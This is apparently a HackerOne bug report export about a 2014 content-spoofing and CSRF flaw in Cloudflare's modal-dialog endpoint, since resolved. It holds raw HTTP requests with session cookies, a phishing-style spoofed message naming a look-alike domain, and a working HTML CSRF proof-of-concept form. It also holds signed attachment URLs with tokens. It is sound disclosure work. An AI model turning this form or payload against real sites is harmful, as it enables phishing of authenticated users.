{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2014-06-07T18:24:18.356Z", 
    "voters": [
        "muhaddix"
    ], 
    "facebook_team?": false, 
    "has_bounty?": false, 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 8806, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": null, 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "Content spoofing /CSRF at https://www.cloudflare.com/ajax/modal-dialog.html", 
    "is_member_of_team?": null, 
    "vote_count": 1, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2014-07-03T05:35:35.383Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2014-04-25T20:43:57.954Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-04-25T20:43:57.954Z", 
            "actor": {
                "username": "jamie", 
                "url": "/jamie", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/767/9125908c121e9bd8929fb83a268cbfadb1ed08d9_medium.png?1398090245"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "cloudflare", 
            "message": "Automated vulnerability scanners commonly have low priority issues and/or false positives. Before submitting the results from a scanner, please take a moment to confirm that the reported issues are actually valid and exploitable. Please reply if you have a working proof-of-concept or reason to believe that this issue is exploitable.", 
            "markdown_message": "<p>Automated vulnerability scanners commonly have low priority issues and/or false positives. Before submitting the results from a scanner, please take a moment to confirm that the reported issues are actually valid and exploitable. Please reply if you have a working proof-of-concept or reason to believe that this issue is exploitable.</p>\n", 
            "type": "Activities::BugNeedsMoreInfo", 
            "id": 38848, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-04-26T00:53:44.474Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-04-26T00:53:44.474Z", 
            "actor": {
                "username": "internetwache", 
                "url": "/internetwache", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/637/8348ca3c21da8852460671dd8d6adef203301b70_medium.png?1391551035"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "cloudflare", 
            "message": "Hi @jamie,\nI'm a bit impressed that you consider my submission the result of automated scanning. Seems like I'm working like a machine lol.\n\nReading through my report, I'm not sure if I got to the right point/conclusions or if failed at explaining them properly.\n\nI'm going to write a more detailed/throughout report tomorrow.\n\nSorry for any incovenience,\nSebastian\n", 
            "markdown_message": "<p>Hi <a href=\"/jamie\">@jamie</a>,<br>\nI&#39;m a bit impressed that you consider my submission the result of automated scanning. Seems like I&#39;m working like a machine lol.</p>\n\n<p>Reading through my report, I&#39;m not sure if I got to the right point/conclusions or if failed at explaining them properly.</p>\n\n<p>I&#39;m going to write a more detailed/throughout report tomorrow.</p>\n\n<p>Sorry for any incovenience,<br>\nSebastian</p>\n", 
            "type": "Activities::BugNew", 
            "id": 38927, 
            "genius_execution_id": null
        }, 
        {
            "attachments": [
                {
                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/007/696/82e39be4a3ce2d3d52b565ab38834aa27efea4b0/cloudflare_poc_1.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTRM4X5HG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T230454Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDDs%2B%2FH8tFp9eaL3SuyK3A4v0Gz1Pk4vLeyx%2Fa%2BOUYIBLln%2BHhEjo8aKsDgcWA0AVPWHQ1CqE69K0fwPJtemp0NnMHwpItZaKfQu2ndzpg6QamoxmJU6CxIEWtJEY3Xtdf2COsdrDtLDojEJ9Bsgq2dXSYC00tKxrlTs4yvW6oAYTu01sZU0MCDpTX84p3oRDZuLOTobhBvHMBRwkOe5yM9PnearXzpjHD9w6d9G0IdijQ15s%2Br%2FCrRq1RQ6%2FGlZaDOuMAFvLZ%2BDU%2BQ4elR42FJO7oqNOhTb7xFUKWMGUZD2l9vrtaQYBWgy8vLJL1PHKNL79uTgKO2gWJuruy5%2FR7g8iF%2F%2BDA%2FXyg6nD5MjJy8mSf4BsfZTsJ7bQ%2BmI19CRcsvBZU%2BD1gUjQkVgOsXdeI4LcCwhSIkIHIAnZLc3YhPCinZgj4lT9UYAmI6j6Ig003H%2B2wt4Gf4YVmv60G6zU1H8wWbJ%2Fm9tXcPEMDdtt2yoQpjl%2FLHFVDNhvjZwxcRsctZU64Qaim%2FPjSts6oYmu4TCHG6yWfeMPRxHXWIQV8xe%2BCLaMnof047dAbkRq5Dx8XgGLGEXX%2FVUX%2F8kf%2FiekmYRSZTqEyMUolrmm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a52b9c2c979812672546f3fe681745c46ea7cf2fa767a90fa4e4dd75f6ed6fc8", 
                    "type": "image/png", 
                    "id": 7696, 
                    "filename": "cloudflare_poc_1.png"
                }, 
                {
                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/007/697/6a8d229f3c4e2d5f64b577ce0d62c6e46a89cf72/cloudflare_poc_2.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTRM4X5HG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T230454Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDDs%2B%2FH8tFp9eaL3SuyK3A4v0Gz1Pk4vLeyx%2Fa%2BOUYIBLln%2BHhEjo8aKsDgcWA0AVPWHQ1CqE69K0fwPJtemp0NnMHwpItZaKfQu2ndzpg6QamoxmJU6CxIEWtJEY3Xtdf2COsdrDtLDojEJ9Bsgq2dXSYC00tKxrlTs4yvW6oAYTu01sZU0MCDpTX84p3oRDZuLOTobhBvHMBRwkOe5yM9PnearXzpjHD9w6d9G0IdijQ15s%2Br%2FCrRq1RQ6%2FGlZaDOuMAFvLZ%2BDU%2BQ4elR42FJO7oqNOhTb7xFUKWMGUZD2l9vrtaQYBWgy8vLJL1PHKNL79uTgKO2gWJuruy5%2FR7g8iF%2F%2BDA%2FXyg6nD5MjJy8mSf4BsfZTsJ7bQ%2BmI19CRcsvBZU%2BD1gUjQkVgOsXdeI4LcCwhSIkIHIAnZLc3YhPCinZgj4lT9UYAmI6j6Ig003H%2B2wt4Gf4YVmv60G6zU1H8wWbJ%2Fm9tXcPEMDdtt2yoQpjl%2FLHFVDNhvjZwxcRsctZU64Qaim%2FPjSts6oYmu4TCHG6yWfeMPRxHXWIQV8xe%2BCLaMnof047dAbkRq5Dx8XgGLGEXX%2FVUX%2F8kf%2FiekmYRSZTqEyMUolrmm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=4370ac0b7ecd8af96d630eadfc50aed3558967f55068da39f632b1ce86e89353", 
                    "type": "image/png", 
                    "id": 7697, 
                    "filename": "cloudflare_poc_2.png"
                }
            ], 
            "automated_response": false, 
            "created_at": "2014-04-26T20:10:49.332Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-04-26T20:10:49.332Z", 
            "actor": {
                "username": "internetwache", 
                "url": "/internetwache", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/637/8348ca3c21da8852460671dd8d6adef203301b70_medium.png?1391551035"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "cloudflare", 
            "message": "Okay,\nI'm going to write the report with some more details again.\nPlease let me know, which part of it seems to be \"automated\". (I'm curious)\n\nI'm going to write down the whole process and some thoughts.\n\n- 1. First, we create a new cloudflare testing account. Nothing special should happen here.\n- 2. Before we continue with the login, we start up burp and configure the browser to route all traffic through it.\n- 3. After successfully logging in, we add a new domain. \n- 4. Now we're going to select the \"Pause cloudflare\" option in the menu of the freshly created domain.\nWe monitor the following HTTP request in burp:\n\n```\nPOST /ajax/modal-dialog.html HTTP/1.1\nHost: www.cloudflare.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0\nAccept: text/html, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nReferer: https://www.cloudflare.com/my-websites\nContent-Length: 249\nCookie: __cfduid=d06d913f43efa0f5a2fd65938cccbcc9b1389285559277; __utma=1.46735460.1398108772.1398112336.1398538770.3; __utmz=1.1398108772.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmb=1.3.10.1398538770; __utmc=1; vses2=mi09p521jhp6ps1ud4lg7pi6e4; __cf_effload=1\nConnection: keep-alive\nPragma: no-cache\nCache-Control: no-cache\n\ntype=default&content=Pause+will+temporarily+deactivate+CloudFlare+for+your+website.+Your+website+will+continue+to+be+online%2C+but+it+will+not+receive+the+performance+and+security+benefits+of+CloudFlare.+Are+you+sure+you+want+to+pause+the+service%3F\n``` \nThe response looks like this:\n```\nHTTP/1.1 200 OK\nServer: cloudflare-nginx\nDate: Sat, 26 Apr 2014 19:39:13 GMT\nContent-Type: text/html\nConnection: keep-alive\nX-Frame-Options: DENY\nVary: Accept-Encoding\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\nCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0\nPragma: no-cache\nSet-Cookie: vses2=mi09p521jhp6ps1ud4lg7pi6e4; path=/; domain=www.cloudflare.com; secure; HttpOnly\nCf-Railgun: 06c91e3042 0010 normal c17d\nCF-RAY: 12153ebea1d800e1-AMS\nContent-Length: 2157\n\n <div id=\"ModalComponent\">\n<div id=\"ModalDialog\" class=\"standard modal\">\n<div class=\"section\">\n<div class=\"article\">\nPause will temporarily deactivate CloudFlare for your website. Your website will continue to be online, but it will not receive the performance and security benefits of CloudFlare. Are you sure you want to pause the service? </div>\n</div>\n</div>\n<script type=\"text/javascript\">[snip...js stuff....snip]</script>\n</div>\n\n```\n\nOh, what can we observer here? The content (```content``` parameter) from the request is embedded in the response.\nSo let's try to conduct some kind of XSS. Adding some ```<h1>foobar</h1>``` stuff to the parameter results in the same response. No luck with that :(. After some more investigation, we know that everything after a ```<``` is removed. \nAs far as I know, you can't write any HTML without this special character. \n\nHowever, we are still able to write whatever we want.  Let's try it: (set the ```content``` parameter as following and resend the above mentioned request)\n\n```\ntype=default&content=Hello+cloudlare+user,%0AWe've+detected+a+problem+with+your+account.%0APlease+send+us+your+account+details+to+support+@+cloudfllare.com.%0A%0AThanks,%0AThe+clouddlare+support+team.\n```\nAs expected, we'll get the same text in the response:\n\n```\n<div class=\"article\">\nHello cloudlare user,\nWe've detected a problem with your account.\nPlease send us your account details to support @ cloudfllare.com.\nThanks,\nThe clouddlare support team. </div>\n</div>\n```\nBeing able to add some foreign content to a AJAX request isn't a security issue by design.\nSo, what next? Taking a look at the ```Content-Type```-Header from the response, we'll see that it's ```text/html```.\n\n```\nHTTP/1.1 200 OK\nServer: cloudflare-nginx\nDate: Sat, 26 Apr 2014 19:07:25 GMT\nContent-Type: text/html\n```\n\nGreat! That way the users browser would interpret the HTML sourcecode of the response and display our message. Otherwise the browsers would display the content as text and the user would see the whole soure code.\n\nNow we need to find a way to display our abitary content to our victim. Some kind of CSRF would be useful for that. \n\nThe HTTP-Request method is ```POST```.  So we'll need a form to submit our payload. \n\nTaking a second look at the HTTP-request we notice some important/optional headers:\n\n```\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nReferer: https://www.cloudflare.com/my-websites\n```\n\nAs we know, we can't send abitary X-headers using HTML forms. So let's check whether this is used as a CSRF protection by removing the ```Referer``` and the ```X-Requested-WIth``` header and by adjusting the ```Content-Type``` to the following:\n\n```\nContent-Type: application/x-www-form-urlencoded\n```\n\nThe new request should look like this:\n\n```\nPOST /ajax/modal-dialog.html HTTP/1.1\nHost: www.cloudflare.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0\nAccept: text/html, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 200\nCookie: __cfduid=d06d913f43efa0f5a2fd65938cccbcc9b1389285559277; __utma=1.46735460.1398108772.1398112336.1398538770.3; __utmz=1.1398108772.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmb=1.3.10.1398538770; __utmc=1; vses2=mi09p521jhp6ps1ud4lg7pi6e4; __cf_effload=1\nConnection: keep-alive\nPragma: no-cache\nCache-Control: no-cache\n\ntype=default&content=Hello+cloudlare+user,%0AWe've+detected+a+problem+with+your+account.%0APlease+send+us+your+account+details+to+support+@+cloudfllare.com.%0A%0AThanks,%0AThe+clouddlare+support+team.\n```\nResubmitting this request through burp gives us the exact result. Seems like there is no CSRF protection in place. Note the double ```l``` in the domain.\n\nLet's create our CSRF PoC:\n\n```\n<html>\n  <body>\n    <form action=\"https://www.cloudflare.com/ajax/modal-dialog.html\" method=\"POST\">\n      <input type=\"hidden\" name=\"type\" value=\"default\" />\n      <input type=\"hidden\" name=\"content\" value=\"Hello&#32;cloudlare&#32;user&#44;&#10;We&apos;ve&#32;detected&#32;a&#32;problem&#32;with&#32;your&#32;account&#46;&#10;Please&#32;send&#32;us&#32;your&#32;account&#32;details&#32;to&#32;support&#32;&#64;&#32;cloudfllare&#46;com&#46;&#10;&#10;Thanks&#44;&#10;The&#32;clouddlare&#32;support&#32;team&#46;\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n  </body>\n</html>\n```\n\nLet's save it as ```/tmp/csrf.html``` and open it in a new tab: ```firefox /tmp/csrf.html```\n\nThis should look like \"cloudflare_poc_1.png\". The submit button is just for testing purposes. Normally an attacker would fire the form automatically when visiting the exploit.\n\nThe final result should look like this. \"cloudflare_poc_2.png\".\n\nAs you can see, we can display abitary content on the cloudflare website for every authenticated user. This could be used for some kind of phishing.\nIt's a very low critical issue, though.\n\n##How to fix:\nAs mentioned  in my original post, there are some ways to fix this problem:\n\n- Implement a CSRF protection or validate the X-Requested-With header. This way, I can't send my abitary content to my victim.\n- Hardcode the embedded response and send a ```content_id``` parameter which will then display the correct message. This way I can't change the content of the response.\n- Set a proper ```Content-Type```. As the content will be embedded into the requesting website by some javascript, you could change the ```Content-Type``` of the response to ```text/plain```. This way my victim would see the whole HTML sourcecode. Nobody would follow the instructions anymore.\n\nI hope that helps,\nSebastian", 
            "markdown_message": "<p>Okay,<br>\nI&#39;m going to write the report with some more details again.<br>\nPlease let me know, which part of it seems to be &quot;automated&quot;. (I&#39;m curious)</p>\n\n<p>I&#39;m going to write down the whole process and some thoughts.</p>\n\n<ul>\n<li>1. First, we create a new cloudflare testing account. Nothing special should happen here.</li>\n<li>2. Before we continue with the login, we start up burp and configure the browser to route all traffic through it.</li>\n<li>3. After successfully logging in, we add a new domain. </li>\n<li>4. Now we&#39;re going to select the &quot;Pause cloudflare&quot; option in the menu of the freshly created domain.\nWe monitor the following HTTP request in burp:</li>\n</ul>\n<pre class=\"highlight plaintext\"><code>POST /ajax/modal-dialog.html HTTP/1.1\nHost: www.cloudflare.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0\nAccept: text/html, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nReferer: https://www.cloudflare.com/my-websites\nContent-Length: 249\nCookie: __cfduid=d06d913f43efa0f5a2fd65938cccbcc9b1389285559277; __utma=1.46735460.1398108772.1398112336.1398538770.3; __utmz=1.1398108772.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmb=1.3.10.1398538770; __utmc=1; vses2=mi09p521jhp6ps1ud4lg7pi6e4; __cf_effload=1\nConnection: keep-alive\nPragma: no-cache\nCache-Control: no-cache\n\ntype=default&amp;content=Pause+will+temporarily+deactivate+CloudFlare+for+your+website.+Your+website+will+continue+to+be+online%2C+but+it+will+not+receive+the+performance+and+security+benefits+of+CloudFlare.+Are+you+sure+you+want+to+pause+the+service%3F\n</code></pre>\n<p>The response looks like this:</p>\n<pre class=\"highlight plaintext\"><code>HTTP/1.1 200 OK\nServer: cloudflare-nginx\nDate: Sat, 26 Apr 2014 19:39:13 GMT\nContent-Type: text/html\nConnection: keep-alive\nX-Frame-Options: DENY\nVary: Accept-Encoding\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\nCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0\nPragma: no-cache\nSet-Cookie: vses2=mi09p521jhp6ps1ud4lg7pi6e4; path=/; domain=www.cloudflare.com; secure; HttpOnly\nCf-Railgun: 06c91e3042 0010 normal c17d\nCF-RAY: 12153ebea1d800e1-AMS\nContent-Length: 2157\n\n &lt;div id=&quot;ModalComponent&quot;&gt;\n&lt;div id=&quot;ModalDialog&quot; class=&quot;standard modal&quot;&gt;\n&lt;div class=&quot;section&quot;&gt;\n&lt;div class=&quot;article&quot;&gt;\nPause will temporarily deactivate CloudFlare for your website. Your website will continue to be online, but it will not receive the performance and security benefits of CloudFlare. Are you sure you want to pause the service? &lt;/div&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;script type=&quot;text/javascript&quot;&gt;[snip...js stuff....snip]&lt;/script&gt;\n&lt;/div&gt;\n\n</code></pre>\n<p>Oh, what can we observer here? The content (<code>content</code> parameter) from the request is embedded in the response.<br>\nSo let&#39;s try to conduct some kind of XSS. Adding some <code>&lt;h1&gt;foobar&lt;/h1&gt;</code> stuff to the parameter results in the same response. No luck with that :(. After some more investigation, we know that everything after a <code>&lt;</code> is removed. <br>\nAs far as I know, you can&#39;t write any HTML without this special character. </p>\n\n<p>However, we are still able to write whatever we want.  Let&#39;s try it: (set the <code>content</code> parameter as following and resend the above mentioned request)</p>\n<pre class=\"highlight plaintext\"><code>type=default&amp;content=Hello+cloudlare+user,%0AWe&#39;ve+detected+a+problem+with+your+account.%0APlease+send+us+your+account+details+to+support+@+cloudfllare.com.%0A%0AThanks,%0AThe+clouddlare+support+team.\n</code></pre>\n<p>As expected, we&#39;ll get the same text in the response:</p>\n<pre class=\"highlight plaintext\"><code>&lt;div class=&quot;article&quot;&gt;\nHello cloudlare user,\nWe&#39;ve detected a problem with your account.\nPlease send us your account details to support @ cloudfllare.com.\nThanks,\nThe clouddlare support team. &lt;/div&gt;\n&lt;/div&gt;\n</code></pre>\n<p>Being able to add some foreign content to a AJAX request isn&#39;t a security issue by design.<br>\nSo, what next? Taking a look at the <code>Content-Type</code>-Header from the response, we&#39;ll see that it&#39;s <code>text/html</code>.</p>\n<pre class=\"highlight plaintext\"><code>HTTP/1.1 200 OK\nServer: cloudflare-nginx\nDate: Sat, 26 Apr 2014 19:07:25 GMT\nContent-Type: text/html\n</code></pre>\n<p>Great! That way the users browser would interpret the HTML sourcecode of the response and display our message. Otherwise the browsers would display the content as text and the user would see the whole soure code.</p>\n\n<p>Now we need to find a way to display our abitary content to our victim. Some kind of CSRF would be useful for that. </p>\n\n<p>The HTTP-Request method is <code>POST</code>.  So we&#39;ll need a form to submit our payload. </p>\n\n<p>Taking a second look at the HTTP-request we notice some important/optional headers:</p>\n<pre class=\"highlight plaintext\"><code>Content-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nReferer: https://www.cloudflare.com/my-websites\n</code></pre>\n<p>As we know, we can&#39;t send abitary X-headers using HTML forms. So let&#39;s check whether this is used as a CSRF protection by removing the <code>Referer</code> and the <code>X-Requested-WIth</code> header and by adjusting the <code>Content-Type</code> to the following:</p>\n<pre class=\"highlight plaintext\"><code>Content-Type: application/x-www-form-urlencoded\n</code></pre>\n<p>The new request should look like this:</p>\n<pre class=\"highlight plaintext\"><code>POST /ajax/modal-dialog.html HTTP/1.1\nHost: www.cloudflare.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0\nAccept: text/html, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 200\nCookie: __cfduid=d06d913f43efa0f5a2fd65938cccbcc9b1389285559277; __utma=1.46735460.1398108772.1398112336.1398538770.3; __utmz=1.1398108772.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmb=1.3.10.1398538770; __utmc=1; vses2=mi09p521jhp6ps1ud4lg7pi6e4; __cf_effload=1\nConnection: keep-alive\nPragma: no-cache\nCache-Control: no-cache\n\ntype=default&amp;content=Hello+cloudlare+user,%0AWe&#39;ve+detected+a+problem+with+your+account.%0APlease+send+us+your+account+details+to+support+@+cloudfllare.com.%0A%0AThanks,%0AThe+clouddlare+support+team.\n</code></pre>\n<p>Resubmitting this request through burp gives us the exact result. Seems like there is no CSRF protection in place. Note the double <code>l</code> in the domain.</p>\n\n<p>Let&#39;s create our CSRF PoC:</p>\n<pre class=\"highlight html\"><code><span class=\"nt\">&lt;html&gt;</span>\n  <span class=\"nt\">&lt;body&gt;</span>\n    <span class=\"nt\">&lt;form</span> <span class=\"na\">action=</span><span class=\"s\">&quot;https://www.cloudflare.com/ajax/modal-dialog.html&quot;</span> <span class=\"na\">method=</span><span class=\"s\">&quot;POST&quot;</span><span class=\"nt\">&gt;</span>\n      <span class=\"nt\">&lt;input</span> <span class=\"na\">type=</span><span class=\"s\">&quot;hidden&quot;</span> <span class=\"na\">name=</span><span class=\"s\">&quot;type&quot;</span> <span class=\"na\">value=</span><span class=\"s\">&quot;default&quot;</span> <span class=\"nt\">/&gt;</span>\n      <span class=\"nt\">&lt;input</span> <span class=\"na\">type=</span><span class=\"s\">&quot;hidden&quot;</span> <span class=\"na\">name=</span><span class=\"s\">&quot;content&quot;</span> <span class=\"na\">value=</span><span class=\"s\">&quot;Hello&amp;#32;cloudlare&amp;#32;user&amp;#44;&amp;#10;We&amp;apos;ve&amp;#32;detected&amp;#32;a&amp;#32;problem&amp;#32;with&amp;#32;your&amp;#32;account&amp;#46;&amp;#10;Please&amp;#32;send&amp;#32;us&amp;#32;your&amp;#32;account&amp;#32;details&amp;#32;to&amp;#32;support&amp;#32;&amp;#64;&amp;#32;cloudfllare&amp;#46;com&amp;#46;&amp;#10;&amp;#10;Thanks&amp;#44;&amp;#10;The&amp;#32;clouddlare&amp;#32;support&amp;#32;team&amp;#46;&quot;</span> <span class=\"nt\">/&gt;</span>\n      <span class=\"nt\">&lt;input</span> <span class=\"na\">type=</span><span class=\"s\">&quot;submit&quot;</span> <span class=\"na\">value=</span><span class=\"s\">&quot;Submit request&quot;</span> <span class=\"nt\">/&gt;</span>\n    <span class=\"nt\">&lt;/form&gt;</span>\n  <span class=\"nt\">&lt;/body&gt;</span>\n<span class=\"nt\">&lt;/html&gt;</span>\n</code></pre>\n<p>Let&#39;s save it as <code>/tmp/csrf.html</code> and open it in a new tab: <code>firefox /tmp/csrf.html</code></p>\n\n<p>This should look like &quot;cloudflare_poc_1.png&quot;. The submit button is just for testing purposes. Normally an attacker would fire the form automatically when visiting the exploit.</p>\n\n<p>The final result should look like this. &quot;cloudflare_poc_2.png&quot;.</p>\n\n<p>As you can see, we can display abitary content on the cloudflare website for every authenticated user. This could be used for some kind of phishing.<br>\nIt&#39;s a very low critical issue, though.</p>\n\n<h2 id=\"how-to-fix\">How to fix:</h2>\n\n<p>As mentioned  in my original post, there are some ways to fix this problem:</p>\n\n<ul>\n<li>Implement a CSRF protection or validate the X-Requested-With header. This way, I can&#39;t send my abitary content to my victim.</li>\n<li>Hardcode the embedded response and send a <code>content_id</code> parameter which will then display the correct message. This way I can&#39;t change the content of the response.</li>\n<li>Set a proper <code>Content-Type</code>. As the content will be embedded into the requesting website by some javascript, you could change the <code>Content-Type</code> of the response to <code>text/plain</code>. This way my victim would see the whole HTML sourcecode. Nobody would follow the instructions anymore.</li>\n</ul>\n\n<p>I hope that helps,<br>\nSebastian</p>\n", 
            "type": "Activities::Comment", 
            "id": 39344, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-05-14T21:51:31.178Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-05-14T21:51:31.178Z", 
            "actor": {
                "username": "justin", 
                "url": "/justin", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/714/2eebae8eb32960de24af801c8d5ad15051291cf0_medium.png?1395966322"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "cloudflare", 
            "message": "Thank you, our engineers continue to review here.", 
            "markdown_message": "<p>Thank you, our engineers continue to review here.</p>\n", 
            "type": "Activities::BugTriaged", 
            "id": 51208, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-05-16T22:32:56.170Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-05-16T22:32:56.170Z", 
            "actor": {
                "username": "justin", 
                "url": "/justin", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/714/2eebae8eb32960de24af801c8d5ad15051291cf0_medium.png?1395966322"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "cloudflare", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugTriaged", 
            "id": 52597, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "internetwache", 
                "url": "/internetwache"
            }, 
            "created_at": "2014-06-03T05:35:35.415Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-06-03T05:35:35.415Z", 
            "actor": {
                "username": "dknecht", 
                "url": "/dknecht", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "cloudflare", 
            "message": "We believe this issue has been resolved. Please take a moment to reassess and let us know if you disagree. We'll follow up with you in the near future to determine if this submission was eligible under our bug bounty program. Thank you!", 
            "markdown_message": "<p>We believe this issue has been resolved. Please take a moment to reassess and let us know if you disagree. We&#39;ll follow up with you in the near future to determine if this submission was eligible under our bug bounty program. Thank you!</p>\n", 
            "type": "Activities::BugResolved", 
            "id": 64594, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-06-03T07:59:15.439Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-06-03T07:59:15.439Z", 
            "actor": {
                "username": "internetwache", 
                "url": "/internetwache", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/637/8348ca3c21da8852460671dd8d6adef203301b70_medium.png?1391551035"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "cloudflare", 
            "message": "Hi @dknecht,\nI'll retest the vulnerability later today and let you know the outcome.\n\nPlease also consider that this particular endpoint was vulnerable to XSS attacks. My investigation regarding to this attack vector wasn't too indepth, and that's why I referer to the writeup from Osanda Malith:\nhttp://osandamalith.wordpress.com/2014/05/31/xss-in-cloudflare/\n\nThanks,\nSebastian", 
            "markdown_message": "<p>Hi <a href=\"/dknecht\">@dknecht</a>,<br>\nI&#39;ll retest the vulnerability later today and let you know the outcome.</p>\n\n<p>Please also consider that this particular endpoint was vulnerable to XSS attacks. My investigation regarding to this attack vector wasn&#39;t too indepth, and that&#39;s why I referer to the writeup from Osanda Malith:<br>\n<a title=\"http://osandamalith.wordpress.com/2014/05/31/xss-in-cloudflare/\" href=\"/redirect?signature=b4d31adbda994384fd7928715c7862cdc55ab8cc&amp;url=http%3A%2F%2Fosandamalith.wordpress.com%2F2014%2F05%2F31%2Fxss-in-cloudflare%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://osandamalith.wordpress.com/2014/05/31/xss-in-cloudflare/</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>Thanks,<br>\nSebastian</p>\n", 
            "type": "Activities::Comment", 
            "id": 64732, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-06-03T18:28:52.102Z", 
            "is_internal": false, 
            "editable": false, 
